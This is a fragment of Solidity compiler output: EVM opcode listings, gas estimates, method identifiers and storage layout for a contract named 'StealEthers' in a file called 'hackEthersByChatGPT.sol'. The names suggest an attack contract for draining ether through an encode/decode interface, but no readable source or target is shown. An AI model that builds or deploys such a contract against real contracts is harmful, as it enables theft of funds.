SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x56E DUP2 PUSH2 0x532 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x5AF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x594 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5C6 DUP3 PUSH2 0x575 JUMP JUMPDEST PUSH2 0x5D0 DUP2 DUP6 PUSH2 0x580 JUMP JUMPDEST SWAP4 POP PUSH2 0x5E0 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x591 JUMP JUMPDEST PUSH2 0x5E9 DUP2 PUSH2 0x2D5 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x60E DUP2 DUP5 PUSH2 0x5BB JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x61F DUP2 PUSH2 0x47A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x62E DUP2 PUSH2 0x47A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x647 DUP2 PUSH2 0x634 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x40 DUP3 ADD PUSH1 0x0 DUP3 ADD MLOAD PUSH2 0x663 PUSH1 0x0 DUP6 ADD DUP3 PUSH2 0x625 JUMP JUMPDEST POP PUSH1 0x20 DUP3 ADD MLOAD PUSH2 0x676 PUSH1 0x20 DUP6 ADD DUP3 PUSH2 0x63E JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x68F DUP2 PUSH2 0x67C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x80 DUP3 ADD SWAP1 POP PUSH2 0x6AA PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x616 JUMP JUMPDEST PUSH2 0x6B7 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x64D JUMP JUMPDEST PUSH2 0x6C4 PUSH1 0x60 DUP4 ADD DUP5 PUSH2 0x686 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 STATICCALL SUB LOG3 PUSH21 0x96AF64D5A8BE49E7C6032FFBFD001D2B0F943199F3 0xD0 0xE8 ORIGIN PUSH9 0x746EA964736F6C6343 STOP ADDMOD SLT STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "358800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"callSubmitEncodeData(bytes)": "infinite",
						"prepareAndCallSubmitEncodeData(address,address)": "infinite"
					}
				},
				"methodIdentifiers": {
					"callSubmitEncodeData(bytes)": "155332f3",
					"prepareAndCallSubmitEncodeData(address,address)": "251b7850"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 15,
						"contract": "hackEthersByChatGPT.sol:StealEthers",
						"label": "abiEncodeDecode",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IAbiEncodeDecode)12"
					}
				],
				"types": {
					"t_contract(IAbiEncodeDecode)12": {
						"encoding": "inplace",
						"label": "contract IAbiEncodeDecode",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}